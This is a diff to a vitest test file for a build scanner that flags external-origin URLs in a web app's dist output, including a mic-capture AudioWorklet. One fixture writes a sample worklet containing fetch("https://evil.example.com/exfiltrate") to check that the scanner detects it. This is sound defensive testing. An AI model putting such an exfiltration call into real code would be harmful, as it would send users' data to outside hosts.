@@ -1,6 +1,7 @@
-import { existsSync } from "node:fs";
+import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
+import { tmpdir } from "node:os";
 import { join } from "node:path";
-import { describe, expect, it } from "vitest";
+import { afterEach, describe, expect, it } from "vitest";
 import {
   DIST_DIR,
   checkCssText,
@@ -100,6 +101,78 @@ describe("check-no-external-origin.mjs — detection logic", () => {
   it("passes JS with no http(s) literal at all", () => {
     expect(checkJsText('console.log("hello")')).toEqual([]);
   });
+
+  it("checkJsText also passes a clean script with only relative/no-literal URLs (the worklet's own shape)", () => {
+    const js = `postMessage(chunk, [chunk.buffer]); const x = "not-a-url";`;
+    expect(checkJsText(js)).toEqual([]);
+  });
+});
+
+// Round 4 (t18): folded into the SAME `checkJsText` the main JS bundle (c)
+// already uses (the reviewer's own instruction -- "fold your worklet
+// presence/scan into that version rather than carrying two scanners").
+// This describe block only proves the NEW surface -- presence and
+// checkDist wiring -- not checkJsText's own detection rules, which the
+// block above already covers exhaustively.
+describe("the cited mic-capture AudioWorklet asset (task t18 round 3, finding 5)", () => {
+  let scratchDir: string | null = null;
+  afterEach(() => {
+    if (scratchDir) rmSync(scratchDir, { recursive: true, force: true });
+    scratchDir = null;
+  });
+
+  it("checkDist reports a finding when dist/worklets/pcm-capture-processor.js is missing (an otherwise-clean build)", () => {
+    // A synthetic dist/ with a clean index.html/CSS but NO worklets/ dir at
+    // all: checkDist must name the missing asset, not silently pass -- the
+    // pre-fix behavior was a build without the worklet exiting 0 with no
+    // signal anywhere, which is exactly the defect this test pins.
+    scratchDir = mkdtempSync(join(tmpdir(), "no-external-origin-worklet-"));
+    writeFileSync(
+      join(scratchDir, "index.html"),
+      `<!doctype html><script type="module" src="/assets/index.js"></script>`,
+    );
+    const findings = checkDist(scratchDir);
+    expect(findings.some((f) => f.includes("pcm-capture-processor.js") && f.includes("missing"))).toBe(
+      true,
+    );
+  });
+
+  it("checkDist reports nothing extra once the worklet is present and clean", () => {
+    scratchDir = mkdtempSync(join(tmpdir(), "no-external-origin-worklet-"));
+    writeFileSync(join(scratchDir, "index.html"), `<!doctype html>`);
+    const workletsDir = join(scratchDir, "worklets");
+    mkdirSync(workletsDir);
+    writeFileSync(join(workletsDir, "pcm-capture-processor.js"), `registerProcessor("x", class {});`);
+    expect(checkDist(scratchDir)).toEqual([]);
+  });
+
+  it("checkDist flags an external-origin string literal inside a present worklet file", () => {
+    scratchDir = mkdtempSync(join(tmpdir(), "no-external-origin-worklet-"));
+    writeFileSync(join(scratchDir, "index.html"), `<!doctype html>`);
+    const workletsDir = join(scratchDir, "worklets");
+    mkdirSync(workletsDir);
+    writeFileSync(
+      join(workletsDir, "pcm-capture-processor.js"),
+      `fetch("https://evil.example.com/exfiltrate");`,
+    );
+    const findings = checkDist(scratchDir);
+    expect(findings.some((f) => f.includes("evil.example.com"))).toBe(true);
+  });
+
+  const distBuilt2 = existsSync(join(DIST_DIR, "worklets", "pcm-capture-processor.js"));
+  it.skipIf(!distBuilt2)(
+    "is present in the real built dist/ and references no external origin",
+    () => {
+      const findings = checkDist();
+      const workletFindings = findings.filter((f) => f.includes("pcm-capture-processor.js"));
+      expect(workletFindings).toEqual([]);
+    },
+  );
+  if (!distBuilt2) {
+    it("is skipped: run `npm run build` first to exercise the worklet check against the real bundle", () => {
+      expect(distBuilt2).toBe(false);
+    });
+  }
 });
 
 describe("the actual built dist/ (acceptance criterion #3)", () => {
